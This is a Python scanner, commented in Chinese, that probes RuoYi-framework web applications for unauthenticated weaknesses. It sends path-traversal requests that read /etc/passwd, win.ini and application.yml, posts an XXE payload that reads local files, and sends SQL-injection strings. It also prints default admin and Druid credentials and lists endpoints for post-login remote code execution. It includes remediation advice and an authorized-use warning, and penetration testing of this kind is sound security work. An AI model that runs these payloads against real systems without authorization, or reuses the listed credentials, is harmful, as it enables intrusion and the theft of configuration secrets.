#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
若依(RuoYi)框架漏洞检测脚本 - 改进版
检测无需登录即可利用的漏洞
"""

import requests
import urllib3
import sys
import re
import base64
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Tuple

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RuoYiScanner:
    def __init__(self, target):
        self.target = self._normalize_url(target)
        self.base_url = self._extract_base_url(target)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/json,*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
        })
        self.vulnerabilities = []

    def _normalize_url(self, url: str) -> str:
        """标准化URL"""
        url = url.rstrip('/')
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url

    def _extract_base_url(self, url: str) -> str:
        """提取基础URL（去除路径）"""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════╗
║         若依(RuoYi)框架漏洞检测工具 v2.0              ║
║              Improved by Security Researcher             ║
╚══════════════════════════════════════════════════════════╝
"""
        print(banner)
        print(f"[*] 目标URL: {self.target}")
        print(f"[*] 基础URL: {self.base_url}")
        print(f"[*] 开始扫描...\n")

    def _safe_request(self, url: str, method: str = 'GET', **kwargs) -> Tuple[bool, requests.Response]:
        """安全的HTTP请求包装"""
        try:
            kwargs.setdefault('timeout', 8)
            kwargs.setdefault('allow_redirects', False)

            if method.upper() == 'GET':
                r = self.session.get(url, **kwargs)
            elif method.upper() == 'POST':
                r = self.session.post(url, **kwargs)
            else:
                return False, None

            return True, r
        except requests.Timeout:
            print(f"    [-] 请求超时: {url}")
            return False, None
        except requests.ConnectionError:
            print(f"    [-] 连接失败: {url}")
            return False, None
        except Exception as e:
            print(f"    [-] 请求异常: {str(e)[:50]}")
            return False, None

    def check_ruoyi(self) -> bool:
        """检测是否为若依框架"""
        print("[1] 正在识别若依框架...")

        # 若依框架特征
        ruoyi_patterns = {
            'keywords': ['ruoyi', '若依', 'RuoYi'],
            'paths': ['/login', '/index', '/captchaImage', '/prod-api/captchaImage'],
            'api_features': ['captchaImage', 'prod-api', 'getInfo', 'system/user'],
            'js_files': ['ruoyi.js', 'ry.js'],
            'html_features': ['若依管理系统', '用户登录', 'RuoYi']
        }

        # 检测主页面
        success, r = self._safe_request(self.target)
        if success and r:
            content = r.text.lower()

            # 检查关键字
            for keyword in ruoyi_patterns['keywords']:
                if keyword.lower() in content:
                    print(f"  [+] 发现若依特征关键字: {keyword}")
                    return True

            # 检查HTML特征
            for feature in ruoyi_patterns['html_features']:
                if feature in r.text:
                    print(f"  [+] 发现若依HTML特征: {feature}")
                    return True

        # 检测API端点
        test_apis = [
            '/prod-api/captchaImage',
            '/captchaImage',
            '/prod-api/getInfo',
            '/system/user/profile'
        ]

        for api in test_apis:
            url = urljoin(self.base_url, api)
            success, r = self._safe_request(url)

            if success and r and r.status_code in [200, 401, 403]:
                try:
                    json_data = r.json()
                    if 'code' in json_data or 'msg' in json_data:
                        print(f"  [+] 发现若依API响应格式: {api}")
                        return True
                except:
                    pass

        print("  [-] 未检测到明显的若依框架特征")
        return False

    def check_druid_console(self) -> bool:
        """检测Druid监控页面未授权访问"""
        print("\n[2] 检测Druid监控页面...")

        druid_paths = [
            '/druid/index.html',
            '/druid/login.html',
            '/druid/websession.html',
            '/druid/sql.html',
            '/prod-api/druid/index.html',
            '/../druid/index.html',  # 路径穿越尝试
        ]

        found = False

        for path in druid_paths:
            url = urljoin(self.base_url, path)
            success, r = self._safe_request(url)

            if not success or not r:
                continue

            # 精确检测Druid特征
            druid_features = [
                'Druid Stat',
                'DruidDataSource',
                'druid-index.css',
                'druid.js',
                'com.alibaba.druid'
            ]

            if r.status_code == 200:
                matched_features = [f for f in druid_features if f in r.text]

                if matched_features:
                    print(f"  [!] 发现Druid监控页面: {url}")
                    print(f"      匹配特征: {', '.join(matched_features[:2])}")

                    # 检测是否需要认证
                    if 'loginUsername' in r.text or 'loginPassword' in r.text:
                        print(f"      [*] 需要登录认证")
                        print(f"      [*] 默认凭据: admin/admin 或 root/root 或 druid/druid")
                        self.vulnerabilities.append({
                            'name': 'Druid监控页面（需认证）',
                            'url': url,
                            'severity': 'Medium'
                        })
                    else:
                        print(f"      [!] 可能无需认证即可访问!")
                        self.vulnerabilities.append({
                            'name': 'Druid监控页面未授权访问',
                            'url': url,
                            'severity': 'High'
                        })

                    found = True
                    break

        if not found:
            print("  [-] 未发现Druid监控页面")

        return found

    def check_swagger(self) -> bool:
        """检测Swagger接口文档"""
        print("\n[3] 检测Swagger接口文档...")

        swagger_paths = [
            '/swagger-ui.html',
            '/swagger-ui/index.html',
            '/doc.html',
            '/api.html',
            '/v2/api-docs',
            '/v3/api-docs',
            '/swagger/index.html',
            '/swagger-resources',
            '/prod-api/swagger-ui.html',
            '/prod-api/doc.html'
        ]

        found = False

        for path in swagger_paths:
            url = urljoin(self.base_url, path)
            success, r = self._safe_request(url)

            if not success or not r:
                continue

            if r.status_code == 200:
                swagger_indicators = [
                    'swagger',
                    'Swagger UI',
                    'api-docs',
                    'springfox',
                    'swagger-ui.css',
                    '"swagger"',
                    'knife4j'
                ]

                matched = [ind for ind in swagger_indicators if ind.lower() in r.text.lower()]

                if matched:
                    print(f"  [!] 发现Swagger文档: {url}")
                    print(f"      [!] 可能泄露完整API接口信息")
                    print(f"      [!] 可能存在CVE-2021-23414 (Swagger UI XSS)")

                    self.vulnerabilities.append({
                        'name': 'Swagger API文档泄露',
                        'url': url,
                        'severity': 'Medium'
                    })

                    found = True
                    break

        if not found:
            print("  [-] 未发现Swagger文档")

        return found

    def check_actuator(self) -> bool:
        """检测Spring Boot Actuator端点"""
        print("\n[4] 检测Actuator端点...")

        actuator_endpoints = [
            '/actuator',
            '/actuator/env',
            '/actuator/health',
            '/actuator/metrics',
            '/actuator/mappings',
            '/actuator/configprops',
            '/actuator/beans',
            '/actuator/heapdump',
            '/actuator/threaddump',
            '/prod-api/actuator',
            '/prod-api/actuator/env'
        ]

        found_endpoints = []

        for endpoint in actuator_endpoints:
            url = urljoin(self.base_url, endpoint)
            success, r = self._safe_request(url)

            if not success or not r:
                continue

            if r.status_code == 200:
                try:
                    # Actuator返回JSON格式
                    json_data = r.json()

                    if isinstance(json_data, dict):
                        print(f"  [!] 发现可访问的Actuator端点: {endpoint}")

                        severity = 'Low'
                        if 'env' in endpoint or 'configprops' in endpoint:
                            print(f"      [!] 可能泄露配置信息（数据库密码、密钥等）")
                            severity = 'High'
                        elif 'heapdump' in endpoint:
                            print(f"      [!] 可下载堆转储文件（严重信息泄露）")
                            severity = 'Critical'
                        elif 'mappings' in endpoint:
                            print(f"      [!] 可获取所有路由映射")
                            severity = 'Medium'

                        found_endpoints.append(endpoint)
                        self.vulnerabilities.append({
                            'name': f'Actuator端点: {endpoint}',
                            'url': url,
                            'severity': severity
                        })

                except:
                    # 可能不是JSON，但仍是有效端点
                    if 'actuator' in r.text.lower() or '_links' in r.text:
                        print(f"  [!] 发现Actuator端点: {endpoint}")
                        found_endpoints.append(endpoint)

        if found_endpoints:
            print(f"  [+] 共发现 {len(found_endpoints)} 个可访问端点")
            return True
        else:
            print("  [-] 未发现可访问的Actuator端点")
            return False

    def check_file_read(self) -> bool:
        """检测任意文件读取漏洞"""
        print("\n[5] 检测任意文件读取漏洞...")

        # 构造测试payload
        test_cases = [
            # Linux系统文件
            {
                'path': '/common/download/resource?resource=/profile/../../../../etc/passwd',
                'indicators': ['root:x:', 'daemon:', 'bin:'],
                'os': 'Linux'
            },
            {
                'path': '/common/download?resource=../../../../etc/passwd',
                'indicators': ['root:x:', 'daemon:', 'bin:'],
                'os': 'Linux'
            },
            # Windows系统文件
            {
                'path': '/common/download/resource?resource=/profile/../../../../windows/win.ini',
                'indicators': ['[extensions]', '[files]', '; for 16-bit app support'],
                'os': 'Windows'
            },
            # 应用配置文件
            {
                'path': '/common/download/resource?resource=/profile/../../../../application.yml',
                'indicators': ['spring:', 'datasource:', 'password:'],
                'os': 'App Config'
            }
        ]

        print("  [*] 影响版本: RuoYi <= 4.7.8")
        print("  [*] 尝试读取系统文件...")

        found = False

        for test in test_cases:
            url = urljoin(self.base_url, test['path'])
            success, r = self._safe_request(url)

            if not success or not r:
                continue

            if r.status_code == 200:
                # 检查响应内容
                matched = [ind for ind in test['indicators'] if ind in r.text]

                if matched:
                    print(f"  [!!!] 存在任意文件读取漏洞!")
                    print(f"        目标系统: {test['os']}")
                    print(f"        匹配特征: {matched[0]}")
                    print(f"        利用URL: {url}")

                    self.vulnerabilities.append({
                        'name': '任意文件读取漏洞',
                        'url': url,
                        'severity': 'Critical'
                    })

                    found = True
                    break

        if not found:
            print("  [-] 未检测到可直接利用的文件读取漏洞")
            print("  [*] 注意: 此漏洞通常需要登录后才能利用")

        return found

    def check_shiro(self) -> bool:
        """检测Shiro反序列化漏洞特征"""
        print("\n[6] 检测Shiro反序列化漏洞...")

        print("  [*] 影响版本: RuoYi < 4.6.2")

        # 第一步：检测是否使用Shiro
        success, r = self._safe_request(self.target)

        if not success or not r:
            print("  [-] 无法连接目标")
            return False

        # 检查Cookie中的rememberMe
        cookies = r.cookies
        headers = r.headers

        has_shiro = False

        if 'rememberMe' in cookies or 'rememberMe' in str(cookies):
            print("  [+] 检测到rememberMe Cookie (Shiro特征)")
            has_shiro = True

        if 'Set-Cookie' in headers and 'rememberMe=deleteMe' in headers.get('Set-Cookie', ''):
            print("  [+] 检测到deleteMe响应 (Shiro特征)")
            has_shiro = True

        if not has_shiro:
            print("  [-] 未检测到明显的Shiro框架特征")
            return False

        # 第二步：尝试检测默认密钥
        print("  [*] 尝试检测Shiro默认密钥...")

        # 构造测试payload (简化版)
        test_cookie = "rememberMe=1"

        success, r = self._safe_request(
            self.target,
            cookies={'rememberMe': test_cookie}
        )

        if success and r:
            response_cookie = r.headers.get('Set-Cookie', '')

            if 'rememberMe=deleteMe' in response_cookie:
                print("  [!] 可能存在Shiro反序列化漏洞!")
                print("  [!] 建议使用专业工具进一步检测:")
                print("      - ShiroScan")
                print("      - shiro_attack")
                print("      - ysoserial")

                self.vulnerabilities.append({
                    'name': 'Shiro反序列化漏洞（需进一步验证）',
                    'url': self.target,
                    'severity': 'Critical'
                })

                return True

        print("  [*] 无法确认是否存在漏洞，建议手工测试")
        return False

    def check_sql_injection(self) -> bool:
        """检测SQL注入点（无需认证的）"""
        print("\n[7] 检测SQL注入...")

        # 若依常见的可能存在注入的公开接口
        sqli_tests = [
            {
                'path': '/system/user/list',
                'param': 'userName',
                'payload': "admin' AND '1'='1"
            },
            {
                'path': '/captchaImage',
                'param': 'type',
                'payload': "1' OR '1'='1"
            }
        ]

        print("  [*] 注意: 大多数SQL注入点需要登录")
        print("  [*] 测试公开接口...")

        found = False

        for test in sqli_tests:
            url = urljoin(self.base_url, test['path'])
            params = {test['param']: test['payload']}

            success, r = self._safe_request(url, params=params)

            if success and r and r.status_code == 200:
                # 检查SQL错误信息
                sql_errors = [
                    'SQL syntax',
                    'mysql_fetch',
                    'ORA-',
                    'PostgreSQL',
                    'SQLServer',
                    'jdbc',
                    'Unclosed quotation'
                ]

                if any(error in r.text for error in sql_errors):
                    print(f"  [!] 可能存在SQL注入: {test['path']}")
                    print(f"      参数: {test['param']}")
                    found = True

        if not found:
            print("  [-] 未发现无需认证的SQL注入点")

        return found

    def check_xxe(self) -> bool:
        """检测XXE漏洞"""
        print("\n[8] 检测XXE漏洞...")

        xml_endpoints = [
            '/prod-api/common/upload',
            '/common/upload'
        ]

        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''

        print("  [*] 测试XML解析端点...")

        for endpoint in xml_endpoints:
            url = urljoin(self.base_url, endpoint)

            success, r = self._safe_request(
                url,
                method='POST',
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'}
            )

            if success and r:
                if 'root:x:' in r.text or 'Entity' in r.text:
                    print(f"  [!] 可能存在XXE漏洞: {endpoint}")
                    return True

        print("  [-] 未检测到XXE漏洞")
        return False

    def generate_report(self):
        """生成检测报告"""
        print("\n" + "=" * 70)
        print("扫描完成! 检测报告")
        print("=" * 70)

        if self.vulnerabilities:
            print(f"\n[!] 发现 {len(self.vulnerabilities)} 个潜在安全问题:\n")

            # 按严重程度分类
            critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
            high = [v for v in self.vulnerabilities if v['severity'] == 'High']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
            low = [v for v in self.vulnerabilities if v['severity'] == 'Low']

            if critical:
                print("【严重】Critical:")
                for v in critical:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if high:
                print("【高危】High:")
                for v in high:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if medium:
                print("【中危】Medium:")
                for v in medium:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")

            if low:
                print("【低危】Low:")
                for v in low:
                    print(f"  - {v['name']}")
                    print(f"    URL: {v['url']}\n")
        else:
            print("\n[+] 未发现明显的安全问题（在无认证情况下）")

        print("\n" + "=" * 70)
        print("需要登录才能测试的已知漏洞:")
        print("=" * 70)
        print("""
1. SQL注入漏洞
   - /system/dept/list (deptId参数)
   - /system/role/list (roleId参数)
   - 影响版本: 多个版本

2. 定时任务命令执行 (RCE)
   - /monitor/job/add
   - 影响版本: <= 4.7.6
   - CVE: 无

3. 任意文件下载
   - /common/download/resource
   - 影响版本: <= 4.7.8

4. Thymeleaf模板注入
   - /monitor/cache/getNames
   - 可导致RCE

5. 文件上传漏洞
   - /common/upload
   - 可能绕过文件类型检测
        """)

        print("=" * 70)
        print("修复建议:")
        print("=" * 70)
        print("""
1. 升级到最新版本的若依框架
2. 禁用或限制Druid监控页面访问（IP白名单）
3. 关闭Swagger文档或增加认证
4. 禁用Spring Boot Actuator或限制访问
5. 修改默认密码:
   - 管理员: admin/admin123 -> 强密码
   - Druid: root/root -> 强密码
6. 配置Shiro使用随机密钥
7. 对所有用户输入进行严格过滤和验证
8. 定期进行安全审计
        """)

        print("=" * 70)
        print("工具说明:")
        print("=" * 70)
        print("""
本工具仅检测无需登录即可利用的漏洞和信息泄露。
更多深度测试需要配合以下专业工具:

- Burp Suite: 完整的Web安全测试
- sqlmap: SQL注入检测
- ShiroScan: Shiro漏洞专项检测
- Nuclei: 批量漏洞检测
- Goby/AWVS: 自动化漏洞扫描

⚠️  请仅在授权范围内使用本工具！
        """)

    def scan(self):
        """执行完整扫描"""
        self.print_banner()

        # 框架识别
        is_ruoyi = self.check_ruoyi()

        if not is_ruoyi:
            print("\n[!] 警告: 目标可能不是若依框架")
            print("[*] 但仍会继续执行通用检测...\n")

        # 执行各项检测
        self.check_druid_console()
        self.check_swagger()
        self.check_actuator()
        self.check_file_read()
        self.check_shiro()
        self.check_sql_injection()
        self.check_xxe()

        # 生成报告
        self.generate_report()


def main():
    if len(sys.argv) != 2:
        print("""
若依(RuoYi)框架漏洞检测工具 v2.0

用法: python3 ruoyi_scanner.py <target_url>

示例:
  python3 ruoyi_scanner.py http://example.com
  python3 ruoyi_scanner.py https://example.com:8080
  python3 ruoyi_scanner.py http://example.com/login

注意:
  - 仅在授权范围内使用
  - 本工具仅检测无需认证的漏洞
  - 需要Python 3.6+和requests库
        """)
        sys.exit(1)

    target = sys.argv[1]

    print("[*] 初始化扫描器...")
    scanner = RuoYiScanner(target)

    try:
        scanner.scan()
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断扫描")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] 扫描过程中发生错误: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()